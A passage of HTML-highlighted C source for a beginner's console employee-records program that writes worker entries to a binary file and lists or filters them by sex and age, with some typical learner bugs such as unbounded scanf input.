string">"感谢您使用本系统，祝您工作愉快\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_1</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">)</span><span class="token comment">//以尾加法插入新的数据，并写入text.dat二进制文件中；</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    <span class="token comment">//p是个指向结构体指针后面需要用到；</span>    p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//对指针p分配大小；</span>    p<span class="token operator">=</span>workers<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入员工号:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>jobNo<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入姓名:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入性别:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入所担任职务:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入年龄："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>p<span class="token operator">-></span>year<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入工资:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入家庭住址："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入员工联系方式："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"ab+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//这段程序是结束函数块的，如果没有这段代码后面内容还会继续输出。</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span>workers<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//将数据存入函数中；</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> ch<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    NUM<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp1<span class="token punctuation">;</span>    fp1<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"data.txt"</span><span class="token punctuation">,</span><span class="token string">"w+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">itoa</span><span class="token punctuation">(</span>NUM<span class="token punctuation">,</span>ch<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//一个没学过的函数，把整形数转化成字符型；</span>    <span class="token function">fputs</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    使用外部变量NUM，在使用者使用程序时先行为，NUM赋值；    */</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_2</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">)</span><span class="token comment">//浏览已经写入的数据；</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   1.浏览全部信息                 2.按性别方式筛选       ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   3.按年龄方式筛选               4.按薪资筛选           ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入筛选的方式\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> k<span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要筛选的员工性别编号\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.男性    \t\t     2.女性\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">,</span><span class="token string">"男"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">,</span><span class="token string">"女"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"你好像想查询什么奇奇怪怪的东西！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> k<span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要筛选的员工薪资范围\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.青年    \t\t     2.壮年\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>        FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">30</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                p<span class="token operator">=</span><span class="token operator">&amp;</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">30</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"——————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>jobNo<span class="token punctuation">,</span> p<span class="token operator">-></span>name<span class="token punctuation">,</span> p<span class="token operator">-></span>sex<span class="token punctuation">,</span> p<span class="token operator">-></span>year<span class="token punctuation">,</span>p<span class="token operator">-></span>position<span class="token punctuation">,</span> p<span class="token operator">-></span>salary<span class="token punctuation">,</span> p<span class="token operator">-></span>addr<span class="token punctuation">,</span> p<span class="token operator">-></span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"—————————————————————————————\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"你好像想查询什么奇奇怪怪的东西！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> k<span class="token punctuation">;</span>        <span class="token 